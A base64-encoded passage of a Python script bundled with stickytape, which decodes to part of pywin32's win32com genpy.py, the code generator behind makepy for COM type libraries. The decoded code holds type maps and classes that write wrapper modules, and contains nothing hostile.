gICAgICBiQnVpbGRIaWRkZW49aGlkZGVuU3BlYyxcbiAgICAgICAgKVxuXG4gICAgaWYgZjpcbiAgICAgICAgZi5jbG9zZSgpXG5cblxuaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjpcbiAgICByYyA9IG1haW4oKVxuICAgIGlmIHJjOlxuICAgICAgICBzeXMuZXhpdChyYylcbiAgICBzeXMuZXhpdCgwKVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3dpbjMyY29tL2NsaWVudC9nZW5weS5weScsIGInIiIiZ2VucHkucHkgLSBUaGUgd29ya2VyIGZvciBtYWtlcHkuICBTZWUgbWFrZXB5LnB5IGZvciBtb3JlIGRldGFpbHNcblxuVGhpcyBjb2RlIHdhcyBtb3ZlZCBzaW1wbHkgdG8gc3BlZWQgUHl0aG9uIGluIG5vcm1hbCBjaXJjdW1zdGFuY2VzLiAgQXMgdGhlIG1ha2VweS5weVxuaXMgbm9ybWFsbHkgcnVuIGZyb20gdGhlIGNvbW1hbmQgbGluZSwgaXQgcmVwYXJzZXMgdGhlIGNvZGUgZWFjaCB0aW1lLiAgTm93IG1ha2VweVxuaXMgbm90aGluZyBtb3JlIHRoYW4gdGhlIGNvbW1hbmQgbGluZSBoYW5kbGVyIGFuZCBwdWJsaWMgaW50ZXJmYWNlLlxuXG5UaGUgbWFrZXB5IGNvbW1hbmQgbGluZSBldGMgaGFuZGxpbmcgaXMgYWxzbyBnZXR0aW5nIGxhcmdlIGVub3VnaCBpbiBpdHMgb3duIHJpZ2h0IVxuIiIiXG5cbiMgTk9URSAtIG5vdyBzdXBwb3J0cyBhICJkZW1hbmQiIG1lY2hhbmlzbSAtIHRoZSB0b3AtbGV2ZWwgaXMgYSBwYWNrYWdlLCBhbmRcbiMgZWFjaCBjbGFzcyBldGMgY2FuIGJlIG1hZGUgaW5kaXZpZHVhbGx5LlxuIyBUaGlzIHNob3VsZCBldmVudHVhbGx5IGJlY29tZSB0aGUgZGVmYXVsdC5cbiMgVGhlbiB0aGUgb2xkIG5vbi1wYWNrYWdlIHRlY2huaXF1ZSBzaG91bGQgYmUgcmVtb3ZlZC5cbiMgVGhlcmUgc2hvdWxkIGJlIG5vIGIvdyBjb21wYXQgaXNzdWVzLCBhbmQgd2lsbCBqdXN0IGhlbHAgY2xlYW4gdGhlIGNvZGUuXG4jIFRoaXMgd2lsbCBiZSBkb25lIG9uY2UgdGhlIG5ldyAiZGVtYW5kIiBtZWNoYW5pc20gZ2V0cyBhIGdvb2Qgd29ya291dC5cbmltcG9ydCBvc1xuaW1wb3J0IHN5c1xuaW1wb3J0IHRpbWVcbmltcG9ydCB3aW4zMmNvbVxuXG5pbXBvcnQgcHl0aG9uY29tXG5mcm9tIC4gaW1wb3J0IGJ1aWxkXG5cbmVycm9yID0gIm1ha2VweS5lcnJvciJcbm1ha2VweV92ZXJzaW9uID0gIjAuNS4wMSIgICMgV3JpdHRlbiB0byBnZW5lcmF0ZWQgZmlsZS5cblxuR0VOX0ZVTEwgPSAiZnVsbCJcbkdFTl9ERU1BTkRfQkFTRSA9ICJkZW1hbmQoYmFzZSkiXG5HRU5fREVNQU5EX0NISUxEID0gImRlbWFuZChjaGlsZCkiXG5cbiMgVGhpcyBtYXAgaXMgdXNlZCBwdXJlbHkgZm9yIHRoZSB1c2VycyBiZW5lZml0IC1pdCBzaG93cyB0aGVcbiMgcmF3LCB1bmRlcmx5aW5nIHR5cGUgb2YgQWxpYXMvRW51bXMsIGV0Yy4gIFRoZSBDT00gaW1wbGVtZW50YXRpb25cbiMgZG9lcyBub3QgdXNlIHRoaXMgbWFwIGF0IHJ1bnRpbWUgLSBhbGwgQWxpYXMvRW51bSBoYXZlIGFscmVhZHlcbiMgYmVlbiB0cmFuc2xhdGVkLlxubWFwVlRUb1R5cGVTdHJpbmcgPSB7XG4gICAgcHl0aG9uY29tLlZUX0kyOiAidHlwZXMuSW50VHlwZSIsXG4gICAgcHl0aG9uY29tLlZUX0k0OiAidHlwZXMuSW50VHlwZSIsXG4gICAgcHl0aG9uY29tLlZUX1I0OiAidHlwZXMuRmxvYXRUeXBlIixcbiAgICBweXRob25jb20uVlRfUjg6ICJ0eXBlcy5GbG9hdFR5cGUiLFxuICAgIHB5dGhvbmNvbS5WVF9CU1RSOiAidHlwZXMuU3RyaW5nVHlwZSIsXG4gICAgcHl0aG9uY29tLlZUX0JPT0w6ICJ0eXBlcy5JbnRUeXBlIixcbiAgICBweXRob25jb20uVlRfVkFSSUFOVDogInR5cGVzLlR5cGVUeXBlIixcbiAgICBweXRob25jb20uVlRfSTE6ICJ0eXBlcy5JbnRUeXBlIixcbiAgICBweXRob25jb20uVlRfVUkxOiAidHlwZXMuSW50VHlwZSIsXG4gICAgcHl0aG9uY29tLlZUX1VJMjogInR5cGVzLkludFR5cGUiLFxuICAgIHB5dGhvbmNvbS5WVF9VSTQ6ICJ0eXBlcy5JbnRUeXBlIixcbiAgICBweXRob25jb20uVlRfSTg6ICJ0eXBlcy5Mb25nVHlwZSIsXG4gICAgcHl0aG9uY29tLlZUX1VJODogInR5cGVzLkxvbmdUeXBlIixcbiAgICBweXRob25jb20uVlRfSU5UOiAidHlwZXMuSW50VHlwZSIsXG4gICAgcHl0aG9uY29tLlZUX0RBVEU6ICJweXRob25jb20uUHlUaW1lVHlwZSIsXG4gICAgcHl0aG9uY29tLlZUX1VJTlQ6ICJ0eXBlcy5JbnRUeXBlIixcbn1cblxuIyBHaXZlbiBhIHByb3BnZXQgZnVuY3Rpb25cJ3MgYXJnIGRlc2MsIHJldHVybiB0aGUgZGVmYXVsdCBwYXJhbWV0ZXJzIGZvciBhbGxcbiMgcGFyYW1zIGJhciB0aGUgZmlyc3QuICBFZywgdGhlbiBQeXRob24gZG9lcyBhOlxuIyBvYmplY3QuUHJvcGVydHkgPSAiZm9vIlxuIyBQeXRob24gY2FuIG9ubHkgcGFzcyB0aGUgImZvbyIgdmFsdWUuICBJZiB0aGUgcHJvcGVydHkgaGFzXG4jIG11bHRpcGxlIGFyZ3MsIGFuZCB0aGUgcmVzdCBoYXZlIGRlZmF1bHQgdmFsdWVzLCB0aGlzIGFsbG93c1xuIyBQeXRob24gdG8gY29ycmVjdGx5IHBhc3MgdGhvc2UgZGVmYXVsdHMuXG5kZWYgTWFrZURlZmF1bHRBcmdzRm9yUHJvcGVydHlQdXQoYXJnc0Rlc2MpOlxuICAgIHJldCA9IFtdXG4gICAgZm9yIGRlc2MgaW4gYXJnc0Rlc2NbMTpdOlxuICAgICAgICBkZWZhdWx0ID0gYnVpbGQuTWFrZURlZmF1bHRBcmdSZXByKGRlc2MpXG4gICAgICAgIGlmIGRlZmF1bHQgaXMgTm9uZTpcbiAgICAgICAgICAgIGJyZWFrXG4gICAgICAgIHJldC5hcHBlbmQoZGVmYXVsdClcbiAgICByZXR1cm4gdHVwbGUocmV0KVxuXG5cbmRlZiBNYWtlTWFwTGluZUVudHJ5KGRpc3BpZCwgd0ZsYWdzLCByZXRUeXBlLCBhcmdUeXBlcywgdXNlciwgcmVzdWx0Q0xTSUQpOlxuICAgICMgU3RyaXAgdGhlIGRlZmF1bHQgdmFsdWVcbiAgICBhcmdUeXBlcyA9IHR1cGxlKFt3aGF0WzoyXSBmb3Igd2hhdCBpbiBhcmdUeXBlc10pXG4gICAgcmV0dXJuIFwnKCVzLCAlZCwgJXMsICVzLCAiJXMiLCAlcylcJyAlIChcbiAgICAgICAgZGlzcGlkLFxuICAgICAgICB3RmxhZ3MsXG4gICAgICAgIHJldFR5cGVbOjJdLFxuICAgICAgICBhcmdUeXBlcyxcbiAgICAgICAgdXNlcixcbiAgICAgICAgcmVzdWx0Q0xTSUQsXG4gICAgKVxuXG5cbmRlZiBNYWtlRXZlbnRNZXRob2ROYW1lKGV2ZW50TmFtZSk6XG4gICAgaWYgZXZlbnROYW1lWzoyXSA9PSAiT24iOlxuICAgICAgICByZXR1cm4gZXZlbnROYW1lXG4gICAgZWxzZTpcbiAgICAgICAgcmV0dXJuICJPbiIgKyBldmVudE5hbWVcblxuXG5kZWYgV3JpdGVTaW5rRXZlbnRNYXAob2JqLCBzdHJlYW0pOlxuICAgIHByaW50KCJcXHRfZGlzcGlkX3RvX2Z1bmNfID0geyIsIGZpbGU9c3RyZWFtKVxuICAgIGZvciBuYW1lLCBlbnRyeSBpbiAoXG4gICAgICAgIGxpc3Qob2JqLnByb3BNYXBHZXQuaXRlbXMoKSlcbiAgICAgICAgKyBsaXN0KG9iai5wcm9wTWFwUHV0Lml0ZW1zKCkpXG4gICAgICAgICsgbGlzdChvYmoubWFwRnVuY3MuaXRlbXMoKSlcbiAgICApOlxuICAgICAgICBmZGVzYyA9IGVudHJ5LmRlc2NcbiAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICBcJ1xcdFxcdCU5ZCA6ICIlcyIsXCcgJSAoZmRlc2MubWVtaWQsIE1ha2VFdmVudE1ldGhvZE5hbWUoZW50cnkubmFtZXNbMF0pKSxcbiAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICApXG4gICAgcHJpbnQoIlxcdFxcdH0iLCBmaWxlPXN0cmVhbSlcblxuXG4jIE1JIGlzIHVzZWQgdG8gam9pbiBteSB3cml0YWJsZSBoZWxwZXJzLCBhbmQgdGhlIE9MRVxuIyBjbGFzc2VzLlxuY2xhc3MgV3JpdGFibGVJdGVtOlxuICAgICMgX19jbXBfXyB1c2VkIGZvciBzb3J0aW5nIGluIHB5MnguLi5cbiAgICBkZWYgX19jbXBfXyhzZWxmLCBvdGhlcik6XG4gICAgICAgICJDb21wYXJlIGZvciBzb3J0aW5nIlxuICAgICAgICByZXQgPSBjbXAoc2VsZi5vcmRlciwgb3RoZXIub3JkZXIpXG4gICAgICAgIGlmIHJldCA9PSAwIGFuZCBzZWxmLmRvYzpcbiAgICAgICAgICAgIHJldCA9IGNtcChzZWxmLmRvY1swXSwgb3RoZXIuZG9jWzBdKVxuICAgICAgICByZXR1cm4gcmV0XG5cbiAgICAjIC4uLiBidXQgbm90IHVzZWQgaW4gcHkzayAtIF9fbHRfXyBtaW5pbXVtIG5lZWRlZCB0aGVyZVxuICAgIGRlZiBfX2x0X18oc2VsZiwgb3RoZXIpOiAgIyBweTNrIHZhcmlhbnRcbiAgICAgICAgaWYgc2VsZi5vcmRlciA9PSBvdGhlci5vcmRlcjpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLmRvYyA8IG90aGVyLmRvY1xuICAgICAgICByZXR1cm4gc2VsZi5vcmRlciA8IG90aGVyLm9yZGVyXG5cbiAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgIHJldHVybiAiT2xlSXRlbTogZG9jPSVzLCBvcmRlcj0lZCIgJSAocmVwcihzZWxmLmRvYyksIHNlbGYub3JkZXIpXG5cblxuY2xhc3MgUmVjb3JkSXRlbShidWlsZC5PbGVJdGVtLCBXcml0YWJsZUl0ZW0pOlxuICAgIG9yZGVyID0gOVxuICAgIHR5cGVuYW1lID0gIlJFQ09SRCJcblxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB0eXBlSW5mbywgdHlwZUF0dHIsIGRvYz1Ob25lLCBiRm9yVXNlcj0xKTpcbiAgICAgICAgIyMgICAgc3lzLnN0ZGVyci53cml0ZSgiUmVjb3JkICVzOiBzaXplICVzXFxuIiAlIChkb2MsdHlwZUF0dHIuY2JTaXplSW5zdGFuY2UpKVxuICAgICAgICAjIyAgICBzeXMuc3RkZXJyLndyaXRlKCIgY1ZhcnMgPSAlc1xcbiIgJSAodHlwZUF0dHIuY1ZhcnMsKSlcbiAgICAgICAgIyMgICAgZm9yIGkgaW4gcmFuZ2UodHlwZUF0dHIuY1ZhcnMpOlxuICAgICAgICAjIyAgICAgICAgdmRlc2MgPSB0eXBlSW5mby5HZXRWYXJEZXNjKGkpXG4gICAgICAgICMjICAgICAgICBzeXMuc3RkZXJyLndyaXRlKCIgVmFyICVkIGhhcyB2YWx1ZSAlcywgdHlwZSAlZCwgZGVzYz0lc1xcbiIgJSAoaSwgdmRlc2MudmFsdWUsIHZkZXNjLnZhcmtpbmQsIHZkZXNjLmVsZW1kZXNjVmFyKSlcbiAgICAgICAgIyMgICAgICAgIHN5cy5zdGRlcnIud3JpdGUoIiBEb2MgaXMgJXNcXG4iICUgKHR5cGVJbmZvLkdldERvY3VtZW50YXRpb24odmRlc2MubWVtaWQpLCkpXG5cbiAgICAgICAgYnVpbGQuT2xlSXRlbS5fX2luaXRfXyhzZWxmLCBkb2MpXG4gICAgICAgIHNlbGYuY2xzaWQgPSB0eXBlQXR0clswXVxuXG4gICAgZGVmIFdyaXRlQ2xhc3Moc2VsZiwgZ2VuZXJhdG9yKTpcbiAgICAgICAgcGFzc1xuXG5cbiMgR2l2ZW4gYW4gZW51bSwgd3JpdGUgYWxsIGFsaWFzZXMgZm9yIGl0LlxuIyAobm8gbG9uZ2VyIG5lY2Vzc2FyeSBmb3IgbmV3IHN0eWxlIGNvZGUsIGJ1dCBzdGlsbCB1c2VkIGZvciBvbGQgY29kZS5cbmRlZiBXcml0ZUFsaWFzZXNGb3JJdGVtKGl0ZW0sIGFsaWFzSXRlbXMsIHN0cmVhbSk6XG4gICAgZm9yIGFsaWFzIGluIGFsaWFzSXRlbXMudmFsdWVzKCk6XG4gICAgICAgIGlmIGl0ZW0uZG9jIGFuZCBhbGlhcy5hbGlhc0RvYyBhbmQgKGFsaWFzLmFsaWFzRG9jWzBdID09IGl0ZW0uZG9jWzBdKTpcbiAgICAgICAgICAgIGFsaWFzLldyaXRlQWxpYXNJdGVtKGFsaWFzSXRlbXMsIHN0cmVhbSlcblxuXG5jbGFzcyBBbGlhc0l0ZW0oYnVpbGQuT2xlSXRlbSwgV3JpdGFibGVJdGVtKTpcbiAgICBvcmRlciA9IDJcbiAgICB0eXBlbmFtZSA9ICJBTElBUyJcblxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB0eXBlaW5mbywgYXR0ciwgZG9jPU5vbmUsIGJGb3JVc2VyPTEpOlxuICAgICAgICBidWlsZC5PbGVJdGVtLl9faW5pdF9fKHNlbGYsIGRvYylcblxuICAgICAgICBhaSA9IGF0dHJbMTRdXG4gICAgICAgIHNlbGYuYXR0ciA9IGF0dHJcbiAgICAgICAgaWYgdHlwZShhaSkgPT0gdHlwZSgoKSkgYW5kIHR5cGUoYWlbMV0pID09IHR5cGUoXG4gICAgICAgICAgICAwXG4gICAgICAgICk6ICAjIFhYWCAtIFRoaXMgaXMgYSBoYWNrIC0gd2h5IHR1cGxlcz8gIE5lZWQgdG8gcmVzb2x2ZT9cbiAgICAgICAgICAgIGhyZWYgPSBhaVsxXVxuICAgICAgICAgICAgYWxpbmZvID0gdHlwZWluZm8uR2V0UmVmVHlwZUluZm8oaHJlZilcbiAgICAgICAgICAgIHNlbGYuYWxpYXNEb2MgPSBhbGluZm8uR2V0RG9jdW1lbnRhdGlvbigtMSlcbiAgICAgICAgICAgIHNlbGYuYWxpYXNBdHRyID0gYWxpbmZvLkdldFR5cGVBdHRyKClcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHNlbGYuYWxpYXNEb2MgPSBOb25lXG4gICAgICAgICAgICBzZWxmLmFsaWFzQXR0ciA9IE5vbmVcblxuICAgIGRlZiBXcml0ZUFsaWFzSXRlbShzZWxmLCBhbGlhc0RpY3QsIHN0cmVhbSk6XG4gICAgICAgICMgd2UgY291bGQgaGF2ZSBiZWVuIHdyaXR0ZW4gYXMgcGFydCBvZiBhbiBhbGlhcyBkZXBlbmRlbmN5XG4gICAgICAgIGlmIHNlbGYuYldyaXR0ZW46XG4gICAgICAgICAgICByZXR1cm5cblxuICAgICAgICBpZiBzZWxmLmFsaWFzRG9jOlxuICAgICAgICAgICAgZGVwTmFtZSA9IHNlbGYuYWxpYXNEb2NbMF1cbiAgICAgICAgICAgIGlmIGRlcE5hbWUgaW4gYWxpYXNEaWN0OlxuICAgICAgICAgICAgICAgIGFsaWFzRGljdFtkZXBOYW1lXS5Xcml0ZUFsaWFzSXRlbShhbGlhc0RpY3QsIHN0cmVhbSlcbiAgICAgICAgICAgIHByaW50KHNlbGYuZG9jWzBdICsgIiA9ICIgKyBkZXBOYW1lLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGFpID0gc2VsZi5hdHRyWzE0XVxuICAgICAgICAgICAgaWYgdHlwZShhaSkgPT0gdHlwZSgwKTpcbiAgICAgICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgICAgIHR5cGVTdHIgPSBtYXBWVFRvVHlwZVN0cmluZ1thaV1cbiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiMgJXM9JXMiICUgKHNlbGYuZG9jWzBdLCB0eXBlU3RyKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOlxuICAgICAgICAgICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZG9jWzBdICsgIiA9IE5vbmUgIyBDYW5cJ3QgY29udmVydCBhbGlhcyBpbmZvICIgKyBzdHIoYWkpLFxuICAgICAgICAgICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgcHJpbnQoZmlsZT1zdHJlYW0pXG4gICAgICAgIHNlbGYuYldyaXR0ZW4gPSAxXG5cblxuY2xhc3MgRW51bWVyYXRpb25JdGVtKGJ1aWxkLk9sZUl0ZW0sIFdyaXRhYmxlSXRlbSk6XG4gICAgb3JkZXIgPSAxXG4gICAgdHlwZW5hbWUgPSAiRU5VTUVSQVRJT04iXG5cbiAgICBkZWYgX19pbml0X18oc2VsZiwgdHlwZWluZm8sIGF0dHIsIGRvYz1Ob25lLCBiRm9yVXNlcj0xKTpcbiAgICAgICAgYnVpbGQuT2xlSXRlbS5fX2luaXRfXyhzZWxmLCBkb2MpXG5cbiAgICAgICAgc2VsZi5jbHNpZCA9IGF0dHJbMF1cbiAgICAgICAgc2VsZi5tYXBWYXJzID0ge31cbiAgICAgICAgdHlwZUZsYWdzID0gYXR0clsxMV1cbiAgICAgICAgc2VsZi5oaWRkZW4gPSAoXG4gICAgICAgICAgICB0eXBlRmxhZ3MgJiBweXRob25jb20uVFlQRUZMQUdfRkhJRERFTlxuICAgICAgICAgICAgb3IgdHlwZUZsYWdzICYgcHl0aG9uY29tLlRZUEVGTEFHX0ZSRVNUUklDVEVEXG4gICAgICAgIClcblxuICAgICAgICBmb3IgaiBpbiByYW5nZShhdHRyWzddKTpcbiAgICAgICAgICAgIHZkZXNjID0gdHlwZWluZm8uR2V0VmFyRGVzYyhqKVxuICAgICAgICAgICAgbmFtZSA9IHR5cGVpbmZvLkdldE5hbWVzKHZkZXNjWzBdKVswXVxuICAgICAgICAgICAgc2VsZi5tYXBWYXJzW25hbWVdID0gYnVpbGQuTWFwRW50cnkodmRlc2MpXG5cbiAgICAjIyAgZGVmIFdyaXRlRW51bWVyYXRpb25IZWFkZXJzKHNlbGYsIGFsaWFzSXRlbXMsIHN0cmVhbSk6XG4gICAgIyMgICAgZW51bU5hbWUgPSBzZWxmLmRvY1swXVxuICAgICMjICAgIHByaW50ID4+IHN0cmVhbSAiJXM9Y29uc3RhbnRzICMgQ29tcGF0aWJpbGl0eSB3aXRoIHByZXZpb3VzIHZlcnNpb25zLiIgJSAoZW51bU5hbWUpXG4gICAgIyMgICAgV3JpdGVBbGlhc2VzRm9ySXRlbShzZWxmLCBhbGlhc0l0ZW1zKVxuXG4gICAgZGVmIFdyaXRlRW51bWVyYXRpb25JdGVtcyhzZWxmLCBzdHJlYW0pOlxuICAgICAgICBudW0gPSAwXG4gICAgICAgIGVudW1OYW1lID0gc2VsZi5kb2NbMF1cbiAgICAgICAgIyBXcml0ZSBpbiBuYW1lIGFscGhhIG9yZGVyXG4gICAgICAgIG5hbWVzID0gbGlzdChzZWxmLm1hcFZhcnMua2V5cygpKVxuICAgICAgICBuYW1lcy5zb3J0KClcbiAgICAgICAgZm9yIG5hbWUgaW4gbmFtZXM6XG4gICAgICAgICAgICBlbnRyeSA9IHNlbGYubWFwVmFyc1tuYW1lXVxuICAgICAgICAgICAgdmRlc2MgPSBlbnRyeS5kZXNjXG4gICAgICAgICAgICBpZiB2ZGVzY1s0XSA9PSBweXRob25jb20uVkFSX0NPTlNUOlxuICAgICAgICAgICAgICAgIHZhbCA9IHZkZXNjWzFdXG5cbiAgICAgICAgICAgICAgICB1c2UgPSByZXByKHZhbClcbiAgICAgICAgICAgICAgICAjIE1ha2Ugc3VyZSB0aGUgcmVwciBvZiB0aGUgdmFsdWUgaXMgdmFsaWQgcHl0aG9uIHN5bnRheFxuICAgICAgICAgICAgICAgICMgc3RpbGwgY291bGQgY2F1c2UgYW4gZXJyb3Igb24gaW1wb3J0IGlmIGl0IGNvbnRhaW5zIGEgbW9kdWxlIG9yIHR5cGUgbmFtZVxuICAgICAgICAgICAgICAgICMgbm90IGF2YWlsYWJsZSBpbiB0aGUgZ2xvYmFsIG5hbWVzcGFjZVxuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgY29tcGlsZSh1c2UsICI8bWFrZXB5PiIsICJldmFsIilcbiAgICAgICAgICAgICAgICBleGNlcHQgU3ludGF4RXJyb3I6XG4gICAgICAgICAgICAgICAgICAgICMgQXQgbGVhc3QgYWRkIHRoZSByZXByIGFzIGEgc3RyaW5nLCBzbyBpdCBjYW4gYmUgaW52ZXN0aWdhdGVkIGZ1cnRoZXJcbiAgICAgICAgICAgICAgICAgICAgIyBTYW5pdGl6ZSBpdCwgaW4gY2FzZSB0aGUgcmVwciBjb250YWlucyBpdHMgb3duIHF1b3Rlcy4gICg/Pz8gbGluZSBicmVha3MgdG9vID8/PylcbiAgICAgICAgICAgICAgICAgICAgdXNlID0gdXNlLnJlcGxhY2UoXCciXCcsICJcJyIpXG4gICAgICAgICAgICAgICAgICAgIHVzZSA9IChcbiAgICAgICAgICAgICAgICAgICAgICAgIFwnIlwnXG4gICAgICAgICAgICAgICAgICAgICAgICArIHVzZVxuICAgICAgICAgICAgICAgICAgICAgICAgKyBcJyJcJ1xuICAgICAgICAgICAgICAgICAgICAgICAgKyAiICMgVGhpcyBWQVJJQU5UIHR5cGUgY2Fubm90IGJlIGNvbnZlcnRlZCBhdXRvbWF0aWNhbGx5IlxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgICAgICJcXHQlLTMwcz0lLTEwcyAjIGZyb20gZW51bSAlcyJcbiAgICAgICAgICAgICAgICAgICAgJSAoYnVpbGQuTWFrZVB1YmxpY0F0dHJpYnV0ZU5hbWUobmFtZSwgVHJ1ZSksIHVzZSwgZW51bU5hbWUpLFxuICAgICAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgbnVtICs9IDFcbiAgICAgICAgcmV0dXJuIG51bVxuXG5cbmNsYXNzIFZUYWJsZUl0ZW0oYnVpbGQuVlRhYmxlSXRlbSwgV3JpdGFibGVJdGVtKTpcbiAgICBvcmRlciA9IDRcblxuICAgIGRlZiBXcml0ZUNsYXNzKHNlbGYsIGdlbmVyYXRvcik6XG4gICAgICAgIHNlbGYuV3JpdGVWVGFibGVNYXAoZ2VuZXJhdG9yKVxuICAgICAgICBzZWxmLmJXcml0dGVuID0gMVxuXG4gICAgZGVmIFdyaXRlVlRhYmxlTWFwKHNlbGYsIGdlbmVyYXRvcik6XG4gICAgICAgIHN0cmVhbSA9IGdlbmVyYXRvci5maWxlXG4gICAgICAgIHByaW50KFxuICAgICAgICAgICAgIiVzX3Z0YWJsZXNfZGlzcGF0Y2hfID0gJWQiICUgKHNlbGYucHl0aG9uX25hbWUsIHNlbGYuYklzRGlzcGF0Y2gpLFxuICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgIClcbiAgICAgICAgcHJpbnQoIiVzX3Z0YWJsZXNfID0gWyIgJSAoc2VsZi5weXRob25fbmFtZSwpLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgZm9yIHYgaW4gc2VsZi52dGFibGVGdW5jczpcbiAgICAgICAgICAgIG5hbWVzLCBkaXNwaWQsIGRlc2MgPSB2XG4gICAgICAgICAgICBhc3NlcnQgZGVzYy5kZXNja2luZCA9PSBweXRob25jb20uREVTQ0tJTkRfRlVOQ0RFU0NcbiAgICAgICAgICAgIGFyZ19yZXBycyA9IFtdXG4gICAgICAgICAgICAjIG1vcmUgaG9vcHMgc28gd2UgZG9uXCd0IGdlbmVyYXRlIGh1Z2UgbGluZXMuXG4gICAgICAgICAgICBpdGVtX251bSA9IDBcbiAgICAgICAgICAgIHByaW50KCJcXHQoKCIsIGVuZD0iICIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgZm9yIG5hbWUgaW4gbmFtZXM6XG4gICAgICAgICAgICAgICAgcHJpbnQocmVwcihuYW1lKSwgIiwiLCBlbmQ9IiAiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgICAgICAgICBpdGVtX251bSA9IGl0ZW1fbnVtICsgMVxuICAgICAgICAgICAgICAgIGlmIGl0ZW1fbnVtICUgNSA9PSAwOlxuICAgICAgICAgICAgICAgICAgICBwcmludCgiXFxuXFx0XFx0XFx0IiwgZW5kPSIgIiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAiKSwgJWQsICglciwgJXIsIFsiICUgKGRpc3BpZCwgZGVzYy5tZW1pZCwgZGVzYy5zY29kZUFycmF5KSxcbiAgICAgICAgICAgICAgICBlbmQ9IiAiLFxuICAgICAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgZm9yIGFyZyBpbiBkZXNjLmFyZ3M6XG4gICAgICAgICAgICAgICAgaXRlbV9udW0gPSBpdGVtX251bSArIDFcbiAgICAgICAgICAgICAgICBpZiBpdGVtX251bSAlIDUgPT0gMDpcbiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxcblxcdFxcdFxcdCIsIGVuZD0iICIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgICAgIGRlZnZhbCA9IGJ1aWxkLk1ha2VEZWZhdWx0QXJnUmVwcihhcmcpXG4gICAgICAgICAgICAgICAgaWYgYXJnWzNdIGlzIE5vbmU6XG4gICAgICAgICAgICAgICAgICAgIGFyZzNfcmVwciA9IE5vbmVcbiAgICAgICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgICAgICBhcmczX3JlcHIgPSByZXByKGFyZ1szXSlcbiAgICAgICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAgICAgcmVwcigoYXJnWzBdLCBhcmdbMV0sIGRlZnZhbCwgYXJnM19yZXByKSksICIsIiwgZW5kPSIgIiwgZmlsZT1zdHJlYW1cbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICBwcmludCgiXSwiLCBlbmQ9IiAiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgICAgIHByaW50KHJlcHIoZGVzYy5mdW5ja2luZCksICIsIiwgZW5kPSIgIiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludChyZXByKGRlc2MuaW52a2luZCksICIsIiwgZW5kPSIgIiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludChyZXByKGRlc2MuY2FsbGNvbnYpLCAiLCIsIGVuZD0iICIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQocmVwcihkZXNjLmNQYXJhbXNPcHQpLCAiLCIsIGVuZD0iICIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQocmVwcihkZXNjLm9WZnQpLCAiLCIsIGVuZD0iICIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQocmVwcihkZXNjLnJldHR5cGUpLCAiLCIsIGVuZD0iICIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQocmVwcihkZXNjLndGdW5jRmxhZ3MpLCAiLCIsIGVuZD0iICIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQoIikpLCIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludChmaWxlPXN0cmVhbSlcblxuXG5jbGFzcyBEaXNwYXRjaEl0ZW0oYnVpbGQuRGlzcGF0Y2hJdGVtLCBXcml0YWJsZUl0ZW0pOlxuICAgIG9yZGVyID0gM1xuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHR5cGVpbmZvLCBhdHRyLCBkb2M9Tm9uZSk6XG4gICAgICAgIGJ1aWxkLkRpc3BhdGNoSXRlbS5fX2luaXRfXyhzZWxmLCB0eXBlaW5mbywgYXR0ciwgZG9jKVxuICAgICAgICBzZWxmLnR5cGVfYXR0ciA9IGF0dHJcbiAgICAgICAgc2VsZi5jb2NsYXNzX2Nsc2lkID0gTm9uZVxuXG4gICAgZGVmIFdyaXRlQ2xhc3Moc2VsZiwgZ2VuZXJhdG9yKTpcbiAgICAgICAgaWYgKFxuICAgICAgICAgICAgbm90IHNlbGYuYklzRGlzcGF0Y2hcbiAgICAgICAgICAgIGFuZCBub3Qgc2VsZi50eXBlX2F0dHIudHlwZWtpbmQgPT0gcHl0aG9uY29tLlRLSU5EX0RJU1BBVENIXG4gICAgICAgICk6XG4gICAgICAgICAgICByZXR1cm5cbiAgIC